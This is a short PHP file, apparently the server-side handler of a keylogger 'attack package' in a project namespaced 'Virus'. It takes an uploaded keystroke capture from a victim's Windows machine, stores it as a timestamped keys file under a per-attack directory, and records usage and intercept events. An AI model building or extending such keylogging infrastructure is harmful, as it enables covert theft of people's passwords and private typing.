<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorKeyboard\MonitorKeyboard $this */

$unixTime = time();
$this->requestData->moveFile("ks", $filePath = DATA_DIR . "/attacks/" . $this->getAttackId() . "/keys-$unixTime.txt");
$this->saveEventFromIntercept($unixTime)->resetStaticUsage();
$this->usage()->addDisk(filesize($filePath))->saveState();
$this->reportStaticUsage()->purgeEvents();
